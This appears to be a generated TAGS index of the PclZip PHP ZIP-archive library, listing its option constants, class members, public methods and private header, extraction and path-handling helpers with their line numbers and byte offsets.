  define( 'PCLZIP_OPT_PATH', 77001 );PCLZIP_OPT_PATH128,5266
  define( 'PCLZIP_OPT_ADD_PATH', 77002 );PCLZIP_OPT_ADD_PATH129,5304
  define( 'PCLZIP_OPT_REMOVE_PATH', 77003 );PCLZIP_OPT_REMOVE_PATH130,5346
  define( 'PCLZIP_OPT_REMOVE_ALL_PATH', 77004 );PCLZIP_OPT_REMOVE_ALL_PATH131,5391
  define( 'PCLZIP_OPT_SET_CHMOD', 77005 );PCLZIP_OPT_SET_CHMOD132,5440
  define( 'PCLZIP_OPT_EXTRACT_AS_STRING', 77006 );PCLZIP_OPT_EXTRACT_AS_STRING133,5483
  define( 'PCLZIP_OPT_NO_COMPRESSION', 77007 );PCLZIP_OPT_NO_COMPRESSION134,5534
  define( 'PCLZIP_OPT_BY_NAME', 77008 );PCLZIP_OPT_BY_NAME135,5582
  define( 'PCLZIP_OPT_BY_INDEX', 77009 );PCLZIP_OPT_BY_INDEX136,5623
  define( 'PCLZIP_OPT_BY_EREG', 77010 );PCLZIP_OPT_BY_EREG137,5665
  define( 'PCLZIP_OPT_BY_PREG', 77011 );PCLZIP_OPT_BY_PREG138,5706
  define( 'PCLZIP_OPT_COMMENT', 77012 );PCLZIP_OPT_COMMENT139,5747
  define( 'PCLZIP_OPT_ADD_COMMENT', 77013 );PCLZIP_OPT_ADD_COMMENT140,5788
  define( 'PCLZIP_OPT_PREPEND_COMMENT', 77014 );PCLZIP_OPT_PREPEND_COMMENT141,5833
  define( 'PCLZIP_OPT_EXTRACT_IN_OUTPUT', 77015 );PCLZIP_OPT_EXTRACT_IN_OUTPUT142,5882
  define( 'PCLZIP_OPT_REPLACE_NEWER', 77016 );PCLZIP_OPT_REPLACE_NEWER143,5933
  define( 'PCLZIP_OPT_STOP_ON_ERROR', 77017 );PCLZIP_OPT_STOP_ON_ERROR144,5980
  define( 'PCLZIP_OPT_EXTRACT_DIR_RESTRICTION', 77019 );PCLZIP_OPT_EXTRACT_DIR_RESTRICTION148,6181
  define( 'PCLZIP_OPT_TEMP_FILE_THRESHOLD', 77020 );PCLZIP_OPT_TEMP_FILE_THRESHOLD149,6238
  define( 'PCLZIP_OPT_ADD_TEMP_FILE_THRESHOLD', 77020 ); // aliasPCLZIP_OPT_ADD_TEMP_FILE_THRESHOLD150,6291
  define( 'PCLZIP_OPT_TEMP_FILE_ON', 77021 );PCLZIP_OPT_TEMP_FILE_ON151,6357
  define( 'PCLZIP_OPT_ADD_TEMP_FILE_ON', 77021 ); // aliasPCLZIP_OPT_ADD_TEMP_FILE_ON152,6403
  define( 'PCLZIP_OPT_TEMP_FILE_OFF', 77022 );PCLZIP_OPT_TEMP_FILE_OFF153,6462
  define( 'PCLZIP_OPT_ADD_TEMP_FILE_OFF', 77022 ); // aliasPCLZIP_OPT_ADD_TEMP_FILE_OFF154,6509
  define( 'PCLZIP_ATT_FILE_NAME', 79001 );PCLZIP_ATT_FILE_NAME157,6609
  define( 'PCLZIP_ATT_FILE_NEW_SHORT_NAME', 79002 );PCLZIP_ATT_FILE_NEW_SHORT_NAME158,6652
  define( 'PCLZIP_ATT_FILE_NEW_FULL_NAME', 79003 );PCLZIP_ATT_FILE_NEW_FULL_NAME159,6705
  define( 'PCLZIP_ATT_FILE_MTIME', 79004 );PCLZIP_ATT_FILE_MTIME160,6757
  define( 'PCLZIP_ATT_FILE_CONTENT', 79005 );PCLZIP_ATT_FILE_CONTENT161,6801
  define( 'PCLZIP_ATT_FILE_COMMENT', 79006 );PCLZIP_ATT_FILE_COMMENT162,6847
  define( 'PCLZIP_CB_PRE_EXTRACT', 78001 );PCLZIP_CB_PRE_EXTRACT165,6923
  define( 'PCLZIP_CB_POST_EXTRACT', 78002 );PCLZIP_CB_POST_EXTRACT166,6967
  define( 'PCLZIP_CB_PRE_ADD', 78003 );PCLZIP_CB_PRE_ADD167,7012
  define( 'PCLZIP_CB_POST_ADD', 78004 );PCLZIP_CB_POST_ADD168,7052
  define( 'PCLZIP_CB_PRE_LIST', 78005 );PCLZIP_CB_PRE_LIST170,7112
  define( 'PCLZIP_CB_POST_LIST', 78006 );PCLZIP_CB_POST_LIST171,7153
  define( 'PCLZIP_CB_PRE_DELETE', 78007 );PCLZIP_CB_PRE_DELETE172,7195
  define( 'PCLZIP_CB_POST_DELETE', 78008 );PCLZIP_CB_POST_DELETE173,7238
  //   PclZip is the class that represent a Zip archive.that179,7413
  class PclZipPclZip190,7948
    var $zipname = '';zipname193,8005
    var $zipname = '';zipname193,8005
    var $zip_fd = 0;zip_fd196,8074
    var $zip_fd = 0;zip_fd196,8074
    var $error_code = 1;error_code199,8133
    var $error_code = 1;error_code199,8133
    var $error_string = '';error_string200,8158
    var $error_string = '';error_string200,8158
    // The class can then disable the magic_quotes and reset it aftercan204,8306
    var $magic_quotes_status;magic_quotes_status205,8376
  function PclZip($p_zipname)PclZip215,8839
    $this->zipname = $p_zipname;zipname225,9052
    $this->zip_fd = 0;zip_fd226,9085
    $this->magic_quotes_status = -1;magic_quotes_status227,9108
  //   create($p_filelist, $p_add_dir="", $p_remove_dir="")p_add_dir236,9371
  //   In this synopsis, the function takes an optional variable list oftakes246,9948
  function create($p_filelist)create271,11269
    $v_result=1;v_result273,11304
    $v_options = array();v_options279,11421
    $v_size = func_num_args();v_size283,11548
      $v_arg_list = func_get_args();v_arg_list288,11668
        $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,v_result298,11959
    $v_string_list = array();v_string_list340,13833
    $v_att_list = array();v_att_list341,13863
    $v_filedescr_list = array();v_filedescr_list342,13890
    $p_result_list = array();p_result_list343,13923
        $v_att_list = $p_filelist;v_att_list351,14233
        $v_string_list = $p_filelist;v_string_list356,14340
      $v_string_list = explode(PCLZIP_SEPARATOR, $p_filelist);v_string_list363,14526
      $v_result = $this->privFileDescrParseAtt($v_entry,v_result393,15496
    $v_result = $this->privFileDescrExpand($v_filedescr_list, $v_options);v_result403,15868
    $v_result = $this->privCreate($v_filedescr_list, $p_result_list, $v_options);v_result409,16025
  //   add($p_filelist, $p_add_dir="", $p_remove_dir="")p_add_dir421,16396
  function add($p_filelist)add454,18115
    $v_result=1;v_result456,18147
    $v_options = array();v_options462,18264
    $v_size = func_num_args();v_size466,18391
      $v_arg_list = func_get_args();v_arg_list471,18511
        $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,v_result481,18802
        $v_options[PCLZIP_OPT_ADD_PATH] = $v_add_path = $v_arg_list[0];v_add_path507,20297
    $v_string_list = array();v_string_list527,20873
    $v_att_list = array();v_att_list528,20903
    $v_filedescr_list = array();v_filedescr_list529,20930
    $p_result_list = array();p_result_list530,20963
        $v_att_list = $p_filelist;v_att_list538,21273
        $v_string_list = $p_filelist;v_string_list543,21380
      $v_string_list = explode(PCLZIP_SEPARATOR, $p_filelist);v_string_list550,21566
      $v_result = $this->privFileDescrParseAtt($v_entry,v_result576,22499
    $v_result = $this->privFileDescrExpand($v_filedescr_list, $v_options);v_result586,22871
    $v_result = $this->privAdd($v_filedescr_list, $p_result_list, $v_options);v_result592,23028
  //                given by the user. For an extract function it is the filenameit609,23702
  function listContent()listContent643,25920
    $v_result=1;v_result645,25949
    $p_list = array();p_list656,26159
  //   extract($p_path="./", $p_remove_path="")p_remove_path670,26520
  function extract()extract700,27974
    $v_result=1;v_result702,27999
    $v_options = array();v_options713,28204
//    $v_path = "./";v_path714,28230
    $v_path = '';v_path715,28252
    $v_remove_path = "";v_remove_path716,28270
    $v_remove_all_path = false;v_remove_all_path717,28295
    $v_size = func_num_args();v_size720,28377
      $v_arg_list = func_get_args();v_arg_list728,28591
        $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,v_result734,28769
          $v_path = $v_options[PCLZIP_OPT_PATH];v_path761,30718
          $v_remove_path = $v_options[PCLZIP_OPT_REMOVE_PATH];v_remove_path764,30834
          $v_remove_all_path = $v_options[PCLZIP_OPT_REMOVE_ALL_PATH];v_remove_all_path767,30968
        $v_path = $v_arg_list[0];v_path784,31508
          $v_remove_path = $v_arg_list[1];v_remove_path788,31626
    $p_list = array();p_list806,32065
    $v_result = $this->privExtractByRule($p_list, $v_path, $v_remove_path,v_result807,32088
  //   extractByIndex($p_index, $p_path="./", $p_remove_path="")p_path822,32539
  function extractByIndex($p_index)extractByIndex857,34336
    $v_result=1;v_result859,34376
    $v_options = array();v_options870,34581
//    $v_path = "./";v_path871,34607
    $v_path = '';v_path872,34629
    $v_remove_path = "";v_remove_path873,34647
    $v_remove_all_path = false;v_remove_all_path874,34672
    $v_size = func_num_args();v_size877,34754
      $v_arg_list = func_get_args();v_arg_list885,34968
        $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,v_result895,35259
          $v_path = $v_options[PCLZIP_OPT_PATH];v_path917,36771
          $v_remove_path = $v_options[PCLZIP_OPT_REMOVE_PATH];v_remove_path920,36887
          $v_remove_all_path = $v_options[PCLZIP_OPT_REMOVE_ALL_PATH];v_remove_all_path923,37021
        $v_path = $v_arg_list[0];v_path945,37720
          $v_remove_path = $v_arg_list[1];v_remove_path949,37838
    $v_arg_trick = array (PCLZIP_OPT_BY_INDEX, $p_index);v_arg_trick966,38271
    $v_options_trick = array();v_options_trick967,38329
    $v_result = $this->privParseOptions($v_arg_trick, sizeof($v_arg_trick), $v_options_trick,v_result968,38361
  function delete()delete1006,39802
    $v_result=1;v_result1008,39826
    $v_options = array();v_options1019,40031
    $v_size = func_num_args();v_size1022,40107
      $v_arg_list = func_get_args();v_arg_list1027,40227
      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,v_result1030,40298
    $v_list = array();v_list1044,40868
  function deleteByIndex($p_index)deleteByIndex1065,41572
    $p_list = $this->delete(PCLZIP_OPT_BY_INDEX, $p_index);p_list1068,41612
  function properties()properties1089,42362
    $v_prop = array();v_prop1105,42688
      $v_central_dir = array();v_central_dir1126,43281
  function duplicate($p_archive)duplicate1162,44507
    $v_result = 1;v_result1164,44544
      $v_result = $this->privDuplicate($p_archive->zipname);v_result1174,44802
        $v_result = PCLZIP_ERR_MISSING_FILE;v_result1186,45244
        $v_result = $this->privDuplicate($p_archive);v_result1190,45349
      $v_result = PCLZIP_ERR_INVALID_PARAMETER;v_result1199,45588
  function merge($p_archive_to_add)merge1221,46497
    $v_result = 1;v_result1223,46537
      $v_result = $this->privMerge($p_archive_to_add);v_result1238,46900
      $v_object_archive = new PclZip($p_archive_to_add);v_object_archive1246,47125
      $v_result = $this->privMerge($v_object_archive);v_result1249,47216
      $v_result = PCLZIP_ERR_INVALID_PARAMETER;v_result1257,47448
  function errorCode()errorCode1272,47875
  function errorName($p_with_code=false)errorName1288,48354
    $v_name = array ( PCLZIP_ERR_NO_ERROR => 'PCLZIP_ERR_NO_ERROR',v_name1290,48399
      $v_value = $v_name[$this->error_code];v_value1314,50243
      $v_value = 'NoName';v_value1317,50305
  function errorInfo($p_full=false)errorInfo1334,50789
  function privCheckFormat($p_level=0)privCheckFormat1373,52276
    $v_result = true;v_result1375,52319
  function privParseOptions(&$p_options_list, $p_size, &$v_result_list, $v_requested_options=false)privParseOptions1426,53931
  function privParseOptions(&$p_options_list, $p_size, &$v_result_list, $v_requested_options=false)v_requested_options1426,53931
    $v_result=1;v_result1428,54035
    $i=0;i1431,54083
          $v_value = $p_options_list[$i+1];v_value1477,55935
          $v_work_list = array();v_work_list1636,62209
              $v_work_list = explode(",", $p_options_list[$i+1]);v_work_list1643,62444
              $v_work_list = $p_options_list[$i+1];v_work_list1649,62725
          $v_sort_flag=false;v_sort_flag1663,63306
          $v_sort_value=0;v_sort_value1664,63336
              $v_item_list = explode("-", $v_work_list[$j]);v_item_list1667,63457
              $v_size_item_list = sizeof($v_item_list);v_size_item_list1668,63518
                  $v_sort_flag=true;v_sort_flag1695,64735
              $v_sort_value = $v_result_list[$p_options_list[$i]][$j]['start'];v_sort_value1704,65143
          $v_function_name = $p_options_list[$i+1];v_function_name1763,67140
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Function '".$v_function_name."()' is not an existing function for option '".PclZipUtilOptionText($p_options_list[$i])."'");for1768,67345
      for ($key=reset($v_requested_options); $key=key($v_requested_options); $key=next($v_requested_options)) {key1795,68148
  function privOptionDefaultThreshold(&$p_options)privOptionDefaultThreshold1826,69233
    $v_result=1;v_result1828,69288
    $v_memory_limit = ini_get('memory_limit');v_memory_limit1836,69505
    $v_memory_limit = trim($v_memory_limit);v_memory_limit1837,69552
    $last = strtolower(substr($v_memory_limit, -1));last1838,69597
        $v_memory_limit = $v_memory_limit*1073741824;v_memory_limit1842,69732
        $v_memory_limit = $v_memory_limit*1048576;v_memory_limit1845,69862
        $v_memory_limit = $v_memory_limit*1024;v_memory_limit1847,69934
  function privFileDescrParseAtt(&$p_file_list, &$p_filedescr, $v_options, $v_requested_options=false)privFileDescrParseAtt1870,70723
  function privFileDescrParseAtt(&$p_file_list, &$p_filedescr, $v_options, $v_requested_options=false)v_requested_options1870,70723
    $v_result=1;v_result1872,70830
    foreach ($p_file_list as $v_key => $v_value) {v_key1875,70908
        for ($key=reset($v_requested_options); $key=key($v_requested_options); $key=next($v_requested_options)) {key1965,74501
  function privFileDescrExpand(&$p_filedescr_list, &$p_options)privFileDescrExpand1999,75868
    $v_result=1;v_result2001,75936
    $v_result_list = array();v_result_list2004,75988
      $v_descr = $p_filedescr_list[$i];v_descr2010,76131
        $v_dirlist_descr = array();v_dirlist_descr2057,77540
        $v_dirlist_nb = 0;v_dirlist_nb2058,77576
          $v_result_list = array_merge($v_result_list, $v_dirlist_descr);v_result_list2100,79152
    $p_filedescr_list = $v_result_list;p_filedescr_list2111,79377
  function privCreate($p_filedescr_list, &$p_result_list, &$p_options)privCreate2124,79810
    $v_result=1;v_result2126,79885
    $v_list_detail = array();v_list_detail2127,79902
    $v_result = $this->privAddList($p_filedescr_list, $p_result_list, $p_options);v_result2140,80190
  function privAdd($p_filedescr_list, &$p_result_list, &$p_options)privAdd2159,80780
    $v_result=1;v_result2161,80852
    $v_list_detail = array();v_list_detail2162,80869
      $v_result = $this->privCreate($p_filedescr_list, $p_result_list, $p_options);v_result2169,81057
    $v_central_dir = array();v_central_dir2188,81532
    $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';v_zip_temp_name2200,81843
    $v_size = $v_central_dir['offset'];v_size2216,82456
      $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);v_read_size2219,82527
      $v_buffer = fread($this->zip_fd, $v_read_size);v_buffer2220,82619
    $v_swap = $this->zip_fd;v_swap2228,82962
    $this->zip_fd = $v_zip_temp_fd;zip_fd2229,82991
    $v_zip_temp_fd = $v_swap;v_zip_temp_fd2230,83027
    $v_header_list = array();v_header_list2233,83085
    $v_offset = @ftell($this->zip_fd);v_offset2246,83453
    $v_size = $v_central_dir['size'];v_size2249,83558
      $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);v_read_size2252,83627
      $v_buffer = @fread($v_zip_temp_fd, $v_read_size);v_buffer2253,83719
    for ($i=0, $v_count=0; $i<sizeof($v_header_list); $i++)v_count2259,83917
    $v_comment = $v_central_dir['comment'];v_comment2280,84573
      $v_comment = $p_options[PCLZIP_OPT_COMMENT];v_comment2282,84666
      $v_comment = $v_comment.$p_options[PCLZIP_OPT_ADD_COMMENT];v_comment2285,84776
      $v_comment = $p_options[PCLZIP_OPT_PREPEND_COMMENT].$v_comment;v_comment2288,84905
    $v_size = @ftell($this->zip_fd)-$v_offset;v_size2292,85036
    $v_swap = $this->zip_fd;v_swap2306,85460
    $this->zip_fd = $v_zip_temp_fd;zip_fd2307,85489
    $v_zip_temp_fd = $v_swap;v_zip_temp_fd2308,85525
  function privOpenFd($p_mode)privOpenFd2338,86404
    $v_result=1;v_result2340,86439
  function privCloseFd()privCloseFd2372,87403
    $v_result=1;v_result2374,87432
    $this->zip_fd = 0;zip_fd2378,87508
//  function privAddList($p_list, &$p_result_list, $p_add_dir, $p_remove_dir, $p_remove_all_dir, &$p_options)privAddList2398,88496
  function privAddList($p_filedescr_list, &$p_result_list, &$p_options)privAddList2399,88606
    $v_result=1;v_result2401,88682
    $v_header_list = array();v_header_list2404,88727
    $v_offset = @ftell($this->zip_fd);v_offset2412,88963
    $v_comment = '';v_comment2431,89559
      $v_comment = $p_options[PCLZIP_OPT_COMMENT];v_comment2433,89629
    $v_size = @ftell($this->zip_fd)-$v_offset;v_size2437,89741
  function privAddFileList($p_filedescr_list, &$p_result_list, &$p_options)privAddFileList2463,90679
    $v_result=1;v_result2465,90759
    $v_header = array();v_header2466,90776
    $v_nb = sizeof($p_result_list);v_nb2469,90860
        $v_result = $this->privAddFile($p_filedescr_list[$j], $v_header,v_result2503,92264
  function privAddFile($p_filedescr, &$p_header, &$p_options)privAddFile2525,92949
    $v_result=1;v_result2527,93015
    $p_filename = $p_filedescr['filename'];p_filename2530,93063
      $v_stored_filename = $p_filedescr['stored_filename'];v_stored_filename2544,93513
      $v_stored_filename = $p_filedescr['stored_filename'];v_stored_filename2547,93590
      $v_local_header = array();v_local_header2616,95683
      $v_result = $p_options[PCLZIP_CB_PRE_ADD](PCLZIP_CB_PRE_ADD, $v_local_header);v_result2622,95922
        $v_result = 1;v_result2626,96116
          $v_result = $this->privAddFileUsingTempFile($p_filedescr, $p_header, $p_options);v_result2656,97212
        $v_content = @fread($v_file, $p_header['size']);v_content2672,97764
          $v_content = @gzdeflate($v_content);v_content2690,98310
        $v_content = $p_filedescr['content'];v_content2713,98962
          $v_content = @gzdeflate($v_content);v_content2728,99438
      $v_local_header = array();v_local_header2769,100768
      $v_result = $p_options[PCLZIP_CB_POST_ADD](PCLZIP_CB_POST_ADD, $v_local_header);v_result2775,101007
        $v_result = 1;v_result2778,101147
  function privAddFileUsingTempFile($p_filedescr, &$p_header, &$p_options)privAddFileUsingTempFile2796,101664
    $v_result=PCLZIP_ERR_NO_ERROR;v_result2798,101743
    $p_filename = $p_filedescr['filename'];p_filename2801,101809
    $v_gzip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.gz';v_gzip_temp_name2811,102145
    $v_size = filesize($p_filename);v_size2819,102554
      $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);v_read_size2821,102618
      $v_buffer = @fread($v_file, $v_read_size);v_buffer2822,102710
    $v_binary_data = @fread($v_file_compressed, 10);v_binary_data2845,103610
    $v_data_header = unpack('a1id1/a1id2/a1cm/a1flag/Vmtime/a1xfl/a1os', $v_binary_data);v_data_header2846,103663
    $v_binary_data = @fread($v_file_compressed, 8);v_binary_data2853,103950
    $v_data_footer = unpack('Vcrc/Vcompressed_size', $v_binary_data);v_data_footer2854,104002
    $v_size = $p_header['compressed_size'];v_size2879,104919
      $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);v_read_size2882,104994
      $v_buffer = @fread($v_file_compressed, $v_read_size);v_buffer2883,105086
  function privCalculateStoredFilename(&$p_filedescr, &$p_options)privCalculateStoredFilename2908,105983
    $v_result=1;v_result2910,106054
    $p_filename = $p_filedescr['filename'];p_filename2913,106103
      $p_add_dir = $p_options[PCLZIP_OPT_ADD_PATH];p_add_dir2915,106197
      $p_add_dir = '';p_add_dir2918,106266
      $p_remove_dir = $p_options[PCLZIP_OPT_REMOVE_PATH];p_remove_dir2921,106348
      $p_remove_dir = '';p_remove_dir2924,106423
      $p_remove_all_dir = $p_options[PCLZIP_OPT_REMOVE_ALL_PATH];p_remove_all_dir2927,106512
      $p_remove_all_dir = 0;p_remove_all_dir2930,106595
      $v_stored_filename = PclZipUtilTranslateWinPath($p_filedescr['new_full_name']);v_stored_filename2937,106761
        $v_path_info = pathinfo($p_filename);v_path_info2946,107074
        $v_dir = '';v_dir2947,107120
          $v_dir = $v_path_info['dirname'].'/';v_dir2949,107186
        $v_stored_filename = $v_dir.$p_filedescr['new_short_name'];v_stored_filename2951,107244
        $v_stored_filename = $p_filename;v_stored_filename2955,107380
        $v_stored_filename = basename($p_filename);v_stored_filename2960,107505
            $p_remove_dir = "./".$p_remove_dir;p_remove_dir2972,107945
            $p_remove_dir = substr($p_remove_dir, 2);p_remove_dir2976,108116
        $v_compare = PclZipUtilPathInclusion($p_remove_dir,v_compare2980,108193
            $v_stored_filename = "";v_stored_filename2984,108382
            $v_stored_filename = substr($v_stored_filename,v_stored_filename2987,108448
      $v_stored_filename = PclZipUtilTranslateWinPath($v_stored_filename);v_stored_filename2994,108645
          $v_stored_filename = $p_add_dir.$v_stored_filename;v_stored_filename2999,108830
          $v_stored_filename = $p_add_dir."/".$v_stored_filename;v_stored_filename3001,108905
    $v_stored_filename = PclZipUtilPathReduction($v_stored_filename);v_stored_filename3006,109041
  function privWriteFileHeader(&$p_header)privWriteFileHeader3020,109571
    $v_result=1;v_result3022,109618
    $v_date = getdate($p_header['mtime']);v_date3028,109796
    $v_mtime = ($v_date['hours']<<11) + ($v_date['minutes']<<5) + $v_date['seconds']/2;v_mtime3029,109839
    $v_mdate = (($v_date['year']-1980)<<9) + ($v_date['mon']<<5) + $v_date['mday'];v_mdate3030,109927
    $v_binary_data = pack("VvvvvvVVVvv", 0x04034b50,v_binary_data3033,110037
  function privWriteCentralFileHeader(&$p_header)privWriteCentralFileHeader3065,111278
    $v_result=1;v_result3067,111332
    //for(reset($p_header); $key = key($p_header); next($p_header)) {key3070,111361
    $v_date = getdate($p_header['mtime']);v_date3074,111500
    $v_mtime = ($v_date['hours']<<11) + ($v_date['minutes']<<5) + $v_date['seconds']/2;v_mtime3075,111543
    $v_mdate = (($v_date['year']-1980)<<9) + ($v_date['mon']<<5) + $v_date['mday'];v_mdate3076,111631
    $v_binary_data = pack("VvvvvvvVVVvvvvvVV", 0x02014b50,v_binary_data3080,111742
  function privWriteCentralHeader($p_nb_entries, $p_size, $p_offset, $p_comment)privWriteCentralHeader3118,113274
    $v_result=1;v_result3120,113359
    $v_binary_data = pack("VvvvvVVv", 0x06054b50, 0, 0, $p_nb_entries,v_binary_data3123,113402
  function privList(&$p_list)privList3147,114205
    $v_result=1;v_result3149,114239
    $v_central_dir = array();v_central_dir3168,114766
  //   This function takes the file informations from the central directorytakes3218,116167
  function privConvertHeader2FileInfo($p_header, &$p_info)privConvertHeader2FileInfo3234,117164
    $v_result=1;v_result3236,117227
    $v_temp_path = PclZipUtilPathReduction($p_header['filename']);v_temp_path3239,117289
    $v_temp_path = PclZipUtilPathReduction($p_header['stored_filename']);v_temp_path3241,117396
  function privExtractByRule(&$p_file_list, $p_path, $p_remove_path, $p_remove_all_path, &$p_options)privExtractByRule3273,119007
    $v_result=1;v_result3275,119113
      $p_path = "./".$p_path;p_path3285,119377
        $p_path = substr($p_path, 0, strlen($p_path)-1);p_path3293,119606
    $p_remove_path_size = strlen($p_remove_path);p_remove_path_size3302,119852
    $v_central_dir = array();v_central_dir3312,120116
    $v_pos_entry = $v_central_dir['offset'];v_pos_entry3323,120406
    $j_start = 0;j_start3326,120481
    for ($i=0, $v_nb_extracted=0; $i<$v_central_dir['entries']; $i++)v_nb_extracted3327,120499
      $v_header = array();v_header3346,121032
      $v_pos_entry = ftell($this->zip_fd);v_pos_entry3360,121387
      $v_extract = false;v_extract3363,121482
                      $v_extract = true;v_extract3378,122263
                  $v_extract = true;v_extract3383,122475
              $v_extract = true;v_extract3395,122849
              $v_extract = true;v_extract3405,123166
                  $v_extract = true;v_extract3417,123662
                  $j_start = $j+1;j_start3420,123783
          $v_extract = true;v_extract3431,124048
          $v_result = $this->privConvertHeader2FileInfo($v_header,v_result3476,125589
          $v_extract = false;v_extract3484,125893
          $v_string = '';v_string3510,126555
          $v_result1 = $this->privExtractFileAsString($v_header, $v_string, $p_options);v_result13513,126621
          $v_result1 = $this->privExtractFileInOutput($v_header, $p_options);v_result13545,127744
          $v_result1 = $this->privExtractFile($v_header,v_result13567,128489
  function privExtractFile(&$p_entry, $p_path, $p_remove_path, $p_remove_all_path, &$p_options)privExtractFile3613,129894
    $v_result=1;v_result3615,129994
      $p_remove_path_size = strlen($p_remove_path);p_remove_path_size3657,131048
      $v_local_header = array();v_local_header3691,132114
      $v_result = $p_options[PCLZIP_CB_PRE_EXTRACT](PCLZIP_CB_PRE_EXTRACT, $v_local_header);v_result3697,132352
        $v_result = 1;v_result3701,132553
      	$v_result = PCLZIP_ERR_USER_ABORTED;v_result3708,132764
        $v_dir_to_check = $p_entry['filename'];v_dir_to_check3796,135739
        $v_dir_to_check = "";v_dir_to_check3798,135838
        $v_dir_to_check = dirname($p_entry['filename']);v_dir_to_check3800,135879
          $v_result = 1;v_result3809,136210
          $v_size = $p_entry['compressed_size'];v_size3836,136921
            $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);v_read_size3839,137013
            $v_buffer = @fread($this->zip_fd, $v_read_size);v_buffer3840,137111
            $v_binary_data = pack('a'.$v_read_size, $v_buffer);v_binary_data3842,137212
            $v_result = $this->privExtractFileUsingTempFile($p_entry, $p_options);v_result3871,138333
            $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);v_buffer3882,138660
            $v_file_content = @gzinflate($v_buffer);v_file_content3885,138778
      $v_local_header = array();v_local_header3937,140207
      $v_result = $p_options[PCLZIP_CB_POST_EXTRACT](PCLZIP_CB_POST_EXTRACT, $v_local_header);v_result3943,140445
      	$v_result = PCLZIP_ERR_USER_ABORTED;v_result3947,140606
  function privExtractFileUsingTempFile(&$p_entry, &$p_options)privExtractFileUsingTempFile3962,141075
    $v_result=1;v_result3964,141143
    $v_gzip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.gz';v_gzip_temp_name3967,141199
    $v_binary_data = pack('va1a1Va1a1', 0x8b1f, Chr($p_entry['compression']), Chr(0x00), time(), Chr(0x00), Chr(3));v_binary_data3976,141576
    $v_size = $p_entry['compressed_size'];v_size3980,141808
      $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);v_read_size3983,141882
      $v_buffer = @fread($this->zip_fd, $v_read_size);v_buffer3984,141974
    $v_binary_data = pack('VV', $p_entry['crc'], $p_entry['size']);v_binary_data3991,142222
    $v_size = $p_entry['size'];v_size4013,143000
      $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);v_read_size4015,143059
      $v_buffer = @gzread($v_src_file, $v_read_size);v_buffer4016,143151
  function privExtractFileInOutput(&$p_entry, &$p_options)privExtractFileInOutput4038,143888
    $v_result=1;v_result4040,143951
      $v_local_header = array();v_local_header4057,144400
      $v_result = $p_options[PCLZIP_CB_PRE_EXTRACT](PCLZIP_CB_PRE_EXTRACT, $v_local_header);v_result4064,144746
        $v_result = 1;v_result4068,144947
      	$v_result = PCLZIP_ERR_USER_ABORTED;v_result4075,145158
          $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);v_buffer4094,145742
          $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);v_buffer4103,146011
          $v_file_content = gzinflate($v_buffer);v_file_content4106,146125
      $v_local_header = array();v_local_header4125,146600
      $v_result = $p_options[PCLZIP_CB_POST_EXTRACT](PCLZIP_CB_POST_EXTRACT, $v_local_header);v_result4131,146838
      	$v_result = PCLZIP_ERR_USER_ABORTED;v_result4135,146999
  function privExtractFileAsString(&$p_entry, &$p_string, &$p_options)privExtractFileAsString4149,147443
    $v_result=1;v_result4151,147518
    $v_header = array();v_header4154,147570
      $v_local_header = array();v_local_header4171,148018
      $v_result = $p_options[PCLZIP_CB_PRE_EXTRACT](PCLZIP_CB_PRE_EXTRACT, $v_local_header);v_result4177,148256
        $v_result = 1;v_result4181,148457
      	$v_result = PCLZIP_ERR_USER_ABORTED;v_result4188,148668
          $p_string = @fread($this->zip_fd, $p_entry['compressed_size']);p_string4207,149257
          $v_data = @fread($this->zip_fd, $p_entry['compressed_size']);v_data4212,149393
      $v_local_header = array();v_local_header4237,150000
      $p_string = '';p_string4242,150190
      $v_result = $p_options[PCLZIP_CB_POST_EXTRACT](PCLZIP_CB_POST_EXTRACT, $v_local_header);v_result4247,150349
      $p_string = $v_local_header['content'];p_string4250,150492
      	$v_result = PCLZIP_ERR_USER_ABORTED;v_result4255,150645
  function privReadFileHeader(&$p_header)privReadFileHeader4270,151104
    $v_result=1;v_result4272,151150
    $v_binary_data = @fread($this->zip_fd, 4);v_binary_data4275,151208
    $v_data = unpack('Vid', $v_binary_data);v_data4276,151255
    $v_binary_data = fread($this->zip_fd, 26);v_binary_data4290,151594
    $v_data = unpack('vversion/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len', $v_binary_data);v_data4306,152028
      $v_hour = ($p_header['mtime'] & 0xF800) >> 11;v_hour4334,153060
      $v_minute = ($p_header['mtime'] & 0x07E0) >> 5;v_minute4335,153113
      $v_seconde = ($p_header['mtime'] & 0x001F)*2;v_seconde4336,153167
      $v_year = (($p_header['mdate'] & 0xFE00) >> 9) + 1980;v_year4339,153248
      $v_month = ($p_header['mdate'] & 0x01E0) >> 5;v_month4340,153309
      $v_day = $p_header['mdate'] & 0x001F;v_day4341,153362
    //for(reset($v_data); $key = key($v_data); next($v_data)) {key4353,153613
  function privReadCentralFileHeader(&$p_header)privReadCentralFileHeader4373,154256
    $v_result=1;v_result4375,154309
    $v_binary_data = @fread($this->zip_fd, 4);v_binary_data4378,154367
